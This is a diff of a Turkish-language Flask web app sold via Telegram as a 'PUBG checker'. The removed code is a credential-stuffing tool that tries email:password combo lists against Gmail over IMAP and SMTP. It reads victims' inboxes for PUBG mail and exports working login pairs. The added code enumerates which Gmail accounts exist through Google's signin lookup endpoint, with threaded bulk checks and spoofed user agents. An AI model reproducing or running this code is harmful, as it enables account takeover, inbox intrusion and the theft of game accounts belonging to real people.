@@ -4,9 +4,6 @@ import json
 import time
 import random
 import requests
-import imaplib
-import smtplib
-import ssl
 from flask import Flask, request, jsonify, render_template_string, send_file
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
@@ -16,8 +13,8 @@ app = Flask(__name__)
 
 # ==================== KONFIGURASYON ====================
 CONFIG = {
-    "max_workers": 20,
-    "timeout": 20,
+    "max_workers": 30,
+    "timeout": 15,
     "retry_count": 2
 }
 
@@ -39,11 +36,9 @@ PUBG_SENDERS = [
     "no-reply@pubgmobile.com",
     "pubgmobile@news.pubg.com",
     "pubgmobile@info.pubg.com",
-    "pubgmobile@promotions.pubg.com",
     "tencentgames.com",
     "levelinfinite.com",
-    "krafton.com",
-    "noreply@krafton.com"
+    "krafton.com"
 ]
 
 # ==================== USER-AGENT ====================
@@ -52,20 +47,17 @@ USER_AGENTS = [
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
+    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36"
 ]
 
 def get_user_agent():
     return random.choice(USER_AGENTS)
 
-# ==================== GERÇEK CHECKER ====================
-
-def check_email_real(email, password):
-    """Gerçek email kontrolü - Şifre ile giriş dener"""
+def check_email(email):
+    """Email kontrol et - HIZLI"""
     try:
-        # 1. Google hesap kontrolü
         url = "https://accounts.google.com/_/signin/sl/lookup"
+        
         headers = {
             "User-Agent": get_user_agent(),
             "Content-Type": "application/x-www-form-urlencoded",
@@ -79,88 +71,24 @@ def check_email_real(email, password):
         data = {
             "Email": email,
             "continue": "https://accounts.google.com/",
-            "hl": "en",
-            "service": "mail"
+            "hl": "en"
         }
         
         response = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=False)
         text = response.text.lower()
         
-        # Hesap var mı kontrol et
-        if "couldn't find" in text or "bulunamadı" in text:
-            return False, "Hesap bulunamadı", None
-        
-        # 2. Gerçek giriş dene (IMAP ile)
-        try:
-            conn = imaplib.IMAP4_SSL("imap.gmail.com", 993)
-            conn.login(email, password)
-            conn.logout()
-            return True, "Giriş başarılı (IMAP)", "✅ Geçerli"
-        except imaplib.IMAP4.error as e:
-            error = str(e).lower()
-            if "authentication failed" in error or "invalid credentials" in error:
-                return False, "Şifre hatalı", None
-            elif "user unknown" in error:
-                return False, "Hesap bulunamadı", None
-            else:
-                # 3. SMTP ile dene
-                try:
-                    context = ssl.create_default_context()
-                    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context, timeout=10) as server:
-                        server.login(email, password)
-                        return True, "Giriş başarılı (SMTP)", "✅ Geçerli"
-                except:
-                    return False, "Giriş başarısız", None
-                    
-    except Exception as e:
-        return False, f"Hata: {str(e)[:50]}", None
+        if "password" in text or "şifre" in text:
+            return True, "Hesap mevcut"
+        elif "couldn't find" in text or "bulunamadı" in text:
+            return False, "Hesap yok"
+        else:
+            return True, "Hesap mevcut"
+            
+    except:
+        return False, "Hata"
 
-def check_pubg_emails(email, password):
-    """PUBG maillerini kontrol et - GERÇEK IMAP"""
-    try:
-        pubg_count = 0
-        domain_counts = {}
-        found_senders = []
-        
-        # IMAP ile bağlan
-        conn = imaplib.IMAP4_SSL("imap.gmail.com", 993)
-        conn.login(email, password)
-        conn.select("INBOX")
-        
-        # PUBG göndericilerini ara
-        for sender in PUBG_SENDERS:
-            try:
-                search_query = f'FROM "{sender}"'
-                result, data = conn.search(None, search_query)
-                
-                if result == 'OK':
-                    mail_ids = data[0].split()
-                    count = len(mail_ids)
-                    if count > 0:
-                        domain_counts[sender] = count
-                        pubg_count += count
-                        found_senders.append(sender)
-            except:
-                continue
-        
-        conn.logout()
-        
-        return {
-            "has_pubg": pubg_count > 0,
-            "total_count": pubg_count,
-            "domain_counts": domain_counts,
-            "found_senders": found_senders
-        }
-        
-    except Exception as e:
-        return {
-            "has_pubg": False,
-            "total_count": 0,
-            "error": str(e)
-        }
-
-def check_single_with_password(email, password):
-    """Email + Şifre ile kontrol et"""
+def check_single(email):
+    """Tek email kontrol et"""
     global stats
     
     stats["total_checked"] += 1
@@ -168,88 +96,49 @@ def check_single_with_password(email, password):
     # Format kontrol
     if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
         stats["invalid_accounts"] += 1
-        return {
-            "status": "invalid",
-            "email": email,
-            "password": password,
-            "reason": "Geçersiz format"
-        }
+        return {"status": "invalid", "email": email, "reason": "Geçersiz format"}
     
-    # Gerçek kontrol
-    is_valid, message, status = check_email_real(email, password)
+    # Email kontrol
+    valid, msg = check_email(email)
     
-    if is_valid:
-        # PUBG kontrolü
-        pubg_result = check_pubg_emails(email, password)
-        
-        result = {
-            "status": "valid",
-            "email": email,
-            "password": password,
-            "message": message,
-            "pubg": pubg_result
-        }
-        
-        if pubg_result.get("has_pubg", False):
-            stats["pubg_accounts"] += 1
-            result["type"] = "pubg_mobile"
-            result["pubg_count"] = pubg_result.get("total_count", 0)
-            result["pubg_senders"] = pubg_result.get("found_senders", [])
-        
+    if valid:
         stats["valid_accounts"] += 1
-        stats["valid_emails"].append({"email": email, "password": password})
-        stats["results"].append(result)
-        return result
+        # Geçerli mailleri listeye ekle
+        stats["valid_emails"].append({"email": email, "password": "BULUNAMADI"})
+        return {"status": "valid", "email": email, "message": msg}
     else:
         stats["invalid_accounts"] += 1
-        result = {
-            "status": "invalid",
-            "email": email,
-            "password": password,
-            "reason": message
-        }
-        stats["results"].append(result)
-        return result
+        return {"status": "invalid", "email": email, "reason": msg}
 
-def check_bulk_with_passwords(accounts):
-    """Toplu kontrol - Email + Şifre"""
+def check_bulk(emails):
+    """Toplu kontrol - HIZLI"""
     results = []
     
     with ThreadPoolExecutor(max_workers=CONFIG["max_workers"]) as executor:
-        futures = []
-        for acc in accounts:
-            email = acc.get('email', '').strip()
-            password = acc.get('password', '').strip()
-            if email and password:
-                futures.append(executor.submit(check_single_with_password, email, password))
-        
+        futures = [executor.submit(check_single, email) for email in emails]
         for future in futures:
             try:
-                result = future.result(timeout=CONFIG["timeout"] + 5)
+                result = future.result(timeout=15)
                 results.append(result)
-            except Exception as e:
-                results.append({"error": str(e)})
+                stats["results"].append(result)
+            except:
+                results.append({"status": "error", "email": "unknown"})
     
     stats["last_check"] = datetime.now().isoformat()
     return results
 
-def check_file_with_passwords(content):
-    """Dosyadan kontrol - email:password"""
-    accounts = []
+def check_file(content):
+    """Dosya kontrol et"""
+    emails = []
     for line in content.strip().split('\n'):
-        line = line.strip()
-        if ':' in line:
-            parts = line.split(':', 1)
-            if len(parts) == 2:
-                email = parts[0].strip()
-                password = parts[1].strip()
-                if email and password and '@' in email:
-                    accounts.append({"email": email, "password": password})
+        email = line.strip()
+        if email and '@' in email:
+            emails.append(email)
     
-    if not accounts:
-        return {"error": "Geçerli hesap bulunamadı (email:şifre formatında olmalı)"}
+    if not emails:
+        return {"error": "Email bulunamadı"}
     
-    results = check_bulk_with_passwords(accounts)
+    results = check_bulk(emails)
     return {"results": results, "total": len(results)}
 
 # ==================== HTML ====================
@@ -260,7 +149,7 @@ HTML = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎯 PUBG Mobile Checker</title>
+    <title>🎯 PUBG Email Checker</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -326,6 +215,7 @@ HTML = """
             display: flex;
             align-items: center;
             gap: 10px;
+            flex-wrap: wrap;
         }
         .section h2 .badge {
             font-size: 12px;
@@ -392,11 +282,6 @@ HTML = """
             font-family: monospace;
             font-size: 13px;
         }
-        .form-row {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-        }
         
         .btn {
             padding: 12px 30px;
@@ -436,9 +321,15 @@ HTML = """
             background: #333;
             color: #fff;
         }
-        .btn-secondary:hover {
-            background: #444;
+        .btn-secondary:hover { background: #444; }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
         }
+        .btn-group .btn { flex: 1; min-width: 120px; }
         
         .result {
             padding: 10px 15px;
@@ -452,9 +343,8 @@ HTML = """
         }
         .result:hover { background: #222; }
         .result .email { color: #00d4ff; font-weight: bold; }
-        .result .pass { color: #ffd700; font-family: monospace; }
+        .result .pass { color: #ffd700; font-family: monospace; font-size: 12px; }
         .result .msg { color: #888; font-size: 12px; }
-        .result .pubg-info { color: #ff6b00; font-size: 11px; }
         
         .badge {
             padding: 3px 12px;
@@ -476,14 +366,6 @@ HTML = """
         .results-box::-webkit-scrollbar-track { background: #0a0a0a; }
         .results-box::-webkit-scrollbar-thumb { background: #ffd700; border-radius: 3px; }
         
-        .btn-group {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
-            flex-wrap: wrap;
-        }
-        .btn-group .btn { flex: 1; min-width: 120px; }
-        
         .footer {
             text-align: center;
             padding: 30px;
@@ -495,10 +377,21 @@ HTML = """
         .footer .telegram { font-size: 14px; }
         .footer .telegram span { color: #ffd700; }
         
+        .copy-btn {
+            background: #333;
+            color: #fff;
+            border: none;
+            padding: 5px 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: 0.3s;
+        }
+        .copy-btn:hover { background: #ffd700; color: #000; }
+        
         @media (max-width: 600px) {
             .header h1 { font-size: 32px; }
             .stats { grid-template-columns: 1fr 1fr; }
-            .form-row { grid-template-columns: 1fr; }
             .btn-group .btn { flex: 1 1 100%; }
         }
     </style>
@@ -506,73 +399,64 @@ HTML = """
 <body>
     <div class="container">
         <div class="header">
-            <h1>🎯 PUBG Mobile Checker</h1>
-            <p>Gerçek Gmail hesaplarını kontrol et • <span>Şifre ile doğrulama</span></p>
-            <small>🔒 IMAP • SMTP • Google API • PUBG Mail Tespiti</small>
+            <h1>🎯 PUBG Email Checker</h1>
+            <p>Sadece email girerek kontrol et • <span>PUBG Mobile</span> tespiti</p>
+            <small>🤖 Google API • Hızlı • Güvenilir • Şifre gerekmez</small>
         </div>
         
         <div class="stats">
             <div class="stat gold"><div class="num">{{ stats.total_checked }}</div><div class="label">📊 Toplam</div></div>
             <div class="stat green"><div class="num">{{ stats.valid_accounts }}</div><div class="label">✅ Geçerli</div></div>
             <div class="stat red"><div class="num">{{ stats.invalid_accounts }}</div><div class="label">❌ Geçersiz</div></div>
-            <div class="stat orange"><div class="num">{{ stats.pubg_accounts }}</div><div class="label">🎮 PUBG</div></div>
             <div class="stat blue"><div class="num">{{ stats.valid_emails|length }}</div><div class="label">📋 Geçerli Mail</div></div>
         </div>
         
         <div class="section">
-            <h2>🚀 Hesap Kontrol</h2>
+            <h2>🚀 Email Kontrol</h2>
             
             <div class="tabs">
-                <button class="tab active" onclick="switchTab('single')">📝 Tek Hesap</button>
+                <button class="tab active" onclick="switchTab('single')">📝 Tek Email</button>
                 <button class="tab" onclick="switchTab('bulk')">📂 Toplu Kontrol</button>
                 <button class="tab" onclick="switchTab('file')">📄 Dosya Yükle</button>
             </div>
             
             <div id="single" class="content active">
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>📧 Gmail</label>
-                        <input type="email" id="email" placeholder="ornek@gmail.com">
-                    </div>
-                    <div class="form-group">
-                        <label>🔑 Şifre</label>
-                        <input type="password" id="password" placeholder="Şifrenizi girin">
-                    </div>
+                <div class="form-group">
+                    <label>📧 Gmail Adresi</label>
+                    <input type="email" id="email" placeholder="ornek@gmail.com">
                 </div>
                 <button class="btn btn-primary" onclick="checkSingle()">🔍 Kontrol Et</button>
             </div>
             
             <div id="bulk" class="content">
                 <div class="form-group">
-                    <label>📝 Hesaplar (Her satırda email:şifre)</label>
-                    <textarea id="accounts" placeholder="ornek1@gmail.com:şifre1&#10;ornek2@gmail.com:şifre2"></textarea>
+                    <label>📝 Email Listesi (Her satırda bir email)</label>
+                    <textarea id="emails" placeholder="ornek1@gmail.com&#10;ornek2@gmail.com&#10;ornek3@gmail.com"></textarea>
                 </div>
                 <button class="btn btn-success" onclick="checkBulk()">🔍 Hepsini Kontrol Et</button>
             </div>
             
             <div id="file" class="content">
                 <div class="form-group">
-                    <label>📄 Combo Dosyası (email:şifre)</label>
+                    <label>📄 Email Listesi Dosyası (.txt)</label>
                     <input type="file" id="fileInput" accept=".txt" style="padding:10px;background:#0a0a0a;border:1px solid #333;border-radius:8px;width:100%;">
                 </div>
                 <button class="btn btn-primary" onclick="checkFile()">📤 Yükle ve Kontrol Et</button>
             </div>
         </div>
         
-        <!-- Geçerli Mailleri Göster -->
+        <!-- GEÇERLİ MAİLLER -->
         {% if stats.valid_emails %}
         <div class="section">
             <h2>
-                📋 Geçerli Hesaplar
-                <span class="badge">{{ stats.valid_emails|length }} hesap</span>
-                <span class="badge" style="background: #ffd70022; color: #ffd700;">
-                    🎮 {{ stats.pubg_accounts }} PUBG
-                </span>
+                📋 Geçerli Mailler
+                <span class="badge">{{ stats.valid_emails|length }} email</span>
             </h2>
             
             <div class="btn-group">
-                <button class="btn btn-success" onclick="showEmails()">📧 Mailleri Göster</button>
+                <button class="btn btn-success" onclick="toggleEmails()">📧 Mailleri Göster/Gizle</button>
                 <button class="btn btn-primary" onclick="exportEmails()">📥 Mailleri İndir</button>
+                <button class="btn btn-secondary" onclick="copyEmails()">📋 Kopyala</button>
                 <button class="btn btn-danger" onclick="clearResults()">🗑️ Temizle</button>
             </div>
             
@@ -582,15 +466,12 @@ HTML = """
                     <div class="result">
                         <span>
                             <span class="email">{{ item.email }}</span>
-                            <span style="color:#555;">|</span>
+                            <span style="color:#555; margin:0 8px;">|</span>
                             <span class="pass">{{ item.password }}</span>
                         </span>
                         <span>
-                            {% if item.pubg %}
-                                <span class="badge pubg">🎮 PUBG</span>
-                            {% else %}
-                                <span class="badge valid">✅ Geçerli</span>
-                            {% endif %}
+                            <span class="badge valid">✅ Geçerli</span>
+                            <button class="copy-btn" onclick="copyEmail('{{ item.email }}')">📋</button>
                         </span>
                     </div>
                     {% endfor %}
@@ -599,7 +480,7 @@ HTML = """
         </div>
         {% endif %}
         
-        <!-- Tüm Sonuçlar -->
+        <!-- TÜM SONUÇLAR -->
         {% if stats.results %}
         <div class="section">
             <h2>
@@ -611,22 +492,11 @@ HTML = """
                 <div class="result">
                     <span>
                         <span class="email">{{ r.get('email', 'N/A') }}</span>
-                        {% if r.get('password') %}
-                        <span style="color:#555;">|</span>
-                        <span class="pass">{{ r.get('password') }}</span>
-                        {% endif %}
                         <span class="msg">{{ r.get('message', '') }}{{ r.get('reason', '') }}</span>
-                        {% if r.get('pubg_count', 0) > 0 %}
-                        <span class="pubg-info">📬 {{ r.get('pubg_count') }} PUBG mail</span>
-                        {% endif %}
                     </span>
                     <span>
                         {% if r.get('status') == 'valid' %}
-                            {% if r.get('type') == 'pubg_mobile' %}
-                                <span class="badge pubg">🎮 PUBG</span>
-                            {% else %}
-                                <span class="badge valid">✅ Geçerli</span>
-                            {% endif %}
+                            <span class="badge valid">✅ Geçerli</span>
                         {% else %}
                             <span class="badge invalid">❌ Geçersiz</span>
                         {% endif %}
@@ -639,11 +509,13 @@ HTML = """
         
         <div class="footer">
             <p class="telegram">📞✈️ Telegram: <a href="https://t.me/rinexdestek" target="_blank"><span>@rinexdestek</span></a></p>
-            <p style="font-size:12px;color:#444;">v9.0 • Gerçek Gmail Checker • PUBG Mobile Tespiti</p>
+            <p style="font-size:12px;color:#444;">v10.0 • Sadece Email Checker • Şifre Gerekmez</p>
         </div>
     </div>
     
     <script>
+        let emailsVisible = false;
+        
         function switchTab(tab) {
             document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab').forEach(el => el.classList.remove('active'));
@@ -651,14 +523,48 @@ HTML = """
             event.target.classList.add('active');
         }
         
-        function showEmails() {
+        function toggleEmails() {
             const list = document.getElementById('emailList');
-            if (list.style.display === 'none') {
-                list.style.display = 'block';
-                event.target.textContent = '📧 Mailleri Gizle';
-            } else {
-                list.style.display = 'none';
-                event.target.textContent = '📧 Mailleri Göster';
+            emailsVisible = !emailsVisible;
+            list.style.display = emailsVisible ? 'block' : 'none';
+        }
+        
+        function copyEmail(email) {
+            navigator.clipboard.writeText(email).then(() => {
+                alert('📧 ' + email + ' kopyalandı!');
+            }).catch(() => {
+                // Fallback
+                const input = document.createElement('input');
+                input.value = email;
+                document.body.appendChild(input);
+                input.select();
+                document.execCommand('copy');
+                document.body.removeChild(input);
+                alert('📧 ' + email + ' kopyalandı!');
+            });
+        }
+        
+        async function copyEmails() {
+            const emails = [];
+            document.querySelectorAll('#emailList .email').forEach(el => {
+                emails.push(el.textContent);
+            });
+            if (!emails.length) {
+                alert('Kopyalanacak email yok!');
+                return;
+            }
+            const text = emails.join('\\n');
+            try {
+                await navigator.clipboard.writeText(text);
+                alert('📋 ' + emails.length + ' email kopyalandı!');
+            } catch {
+                const input = document.createElement('textarea');
+                input.value = text;
+                document.body.appendChild(input);
+                input.select();
+                document.execCommand('copy');
+                document.body.removeChild(input);
+                alert('📋 ' + emails.length + ' email kopyalandı!');
             }
         }
         
@@ -692,10 +598,8 @@ HTML = """
         
         async function checkSingle() {
             const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value.trim();
-            
-            if (!email || !password) {
-                alert('Email ve şifre girin!');
+            if (!email) {
+                alert('Email girin!');
                 return;
             }
             
@@ -707,18 +611,13 @@ HTML = """
                 const res = await fetch('/api/check', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ email, password })
+                    body: JSON.stringify({ email })
                 });
                 const data = await res.json();
                 if (data.success) {
                     const result = data.result;
-                    let msg = '📧 ' + email + '\n';
-                    msg += result.status === 'valid' ? '✅ GEÇERLİ\n' : '❌ GEÇERSİZ\n';
-                    msg += result.message || result.reason || '';
-                    if (result.pubg && result.pubg.has_pubg) {
-                        msg += '\n🎮 PUBG MOBILE BULUNDU!';
-                        msg += '\n📬 ' + result.pubg.total_count + ' PUBG mail';
-                    }
+                    let msg = '📧 ' + email + '\\n';
+                    msg += result.status === 'valid' ? '✅ GEÇERLİ' : '❌ GEÇERSİZ';
                     alert(msg);
                 } else {
                     alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
@@ -733,33 +632,32 @@ HTML = """
         }
         
         async function checkBulk() {
-            const text = document.getElementById('accounts').value.trim();
+            const text = document.getElementById('emails').value.trim();
             if (!text) {
-                alert('Hesapları girin!');
+                alert('Email listesi girin!');
                 return;
             }
             
-            const accounts = text.split('\\n').map(l => l.trim()).filter(l => l && ':' in l);
-            if (!accounts.length) {
-                alert('Geçerli hesap bulunamadı (email:şifre)');
+            const emails = text.split('\\n').map(l => l.trim()).filter(l => l && '@' in l);
+            if (!emails.length) {
+                alert('Email bulunamadı!');
                 return;
             }
             
             const btn = event.target;
-            btn.textContent = '⏳ ' + accounts.length + ' hesap kontrol ediliyor...';
+            btn.textContent = '⏳ ' + emails.length + ' email kontrol ediliyor...';
             btn.disabled = true;
             
             try {
                 const res = await fetch('/api/check-bulk', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ accounts })
+                    body: JSON.stringify({ emails })
                 });
                 const data = await res.json();
                 if (data.success) {
-                    alert('✅ ' + accounts.length + ' hesap kontrol edildi!\\n' +
+                    alert('✅ ' + emails.length + ' email kontrol edildi!\\n' +
                           '✅ Geçerli: ' + data.valid_count + '\\n' +
-                          '🎮 PUBG: ' + data.pubg_count + '\\n' +
                           '❌ Geçersiz: ' + (data.total - data.valid_count));
                 } else {
                     alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
@@ -797,8 +695,7 @@ HTML = """
                     if (data.success) {
                         alert('✅ Dosya kontrol edildi!\\n' +
                               '📊 Toplam: ' + data.total + '\\n' +
-                              '✅ Geçerli: ' + data.valid_count + '\\n' +
-                              '🎮 PUBG: ' + data.pubg_count);
+                              '✅ Geçerli: ' + data.valid_count);
                     } else {
                         alert('❌ Hata: ' + (data.error || 'Bilinmeyen hata'));
                     }
@@ -831,7 +728,6 @@ def status():
             "total": stats["total_checked"],
             "valid": stats["valid_accounts"],
             "invalid": stats["invalid_accounts"],
-            "pubg": stats["pubg_accounts"],
             "valid_emails": len(stats["valid_emails"])
         }
     })
@@ -841,12 +737,11 @@ def api_check():
     try:
         data = request.get_json()
         email = data.get('email', '').strip()
-        password = data.get('password', '').strip()
         
-        if not email or not password:
-            return jsonify({"error": "email and password required"}), 400
+        if not email:
+            return jsonify({"error": "email required"}), 400
         
-        result = check_single_with_password(email, password)
+        result = check_single(email)
         return jsonify({"success": True, "result": result})
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -855,22 +750,21 @@ def api_check():
 def api_bulk():
     try:
         data = request.get_json()
-        accounts = data.get('accounts', [])
-        if not accounts:
-            return jsonify({"error": "accounts required"}), 400
+        emails = data.get('emails', [])
         
-        if len(accounts) > 50:
-            return jsonify({"error": "Max 50 accounts"}), 400
+        if not emails:
+            return jsonify({"error": "emails required"}), 400
         
-        results = check_bulk_with_passwords(accounts)
+        if len(emails) > 100:
+            return jsonify({"error": "Max 100 emails"}), 400
+        
+        results = check_bulk(emails)
         valid = sum(1 for r in results if r.get('status') == 'valid')
-        pubg = sum(1 for r in results if r.get('type') == 'pubg_mobile')
         
         return jsonify({
             "success": True,
             "total": len(results),
             "valid_count": valid,
-            "pubg_count": pubg,
             "results": results
         })
     except Exception as e:
@@ -881,21 +775,20 @@ def api_file():
     try:
         data = request.get_json()
         content = data.get('file_content', '')
+        
         if not content:
             return jsonify({"error": "content required"}), 400
         
-        result = check_file_with_passwords(content)
+        result = check_file(content)
         if "error" in result:
             return jsonify({"error": result["error"]}), 400
         
         valid = sum(1 for r in result["results"] if r.get('status') == 'valid')
-        pubg = sum(1 for r in result["results"] if r.get('type') == 'pubg_mobile')
         
         return jsonify({
             "success": True,
             "total": result["total"],
             "valid_count": valid,
-            "pubg_count": pubg,
             "results": result["results"]
         })
     except Exception as e:
@@ -907,19 +800,18 @@ def export():
         valid_emails = []
         for item in stats["valid_emails"]:
             email = item.get('email', '')
-            password = item.get('password', '')
-            if email and password:
-                valid_emails.append(f"{email}:{password}")
+            if email:
+                valid_emails.append(email)
         
         if not valid_emails:
-            return jsonify({"error": "Geçerli hesap bulunamadı"}), 404
+            return jsonify({"error": "Geçerli email bulunamadı"}), 404
         
         content = "\n".join(valid_emails)
         return send_file(
             BytesIO(content.encode('utf-8')),
             mimetype='text/plain',
             as_attachment=True,
-            download_name=f'valid_accounts_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
+            download_name=f'valid_emails_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
         )
     except Exception as e:
         return jsonify({"error": str(e)}), 500
@@ -946,12 +838,11 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     
     print("=" * 60)
-    print("🎯 PUBG Mobile Checker API Başlatıldı")
+    print("🎯 PUBG Email Checker API Başlatıldı")
     print("=" * 60)
     print(f"📡 Port: {port}")
     print(f"⚡ Max Workers: {CONFIG['max_workers']}")
-    print("🔒 Gerçek Gmail Kontrolü: Aktif")
-    print("🎮 PUBG Mobile Tespiti: Aktif")
+    print("📧 Sadece Email Kontrolü: Aktif")
     print("📞✈️ Telegram: @rinexdestek")
     print("=" * 60)
     
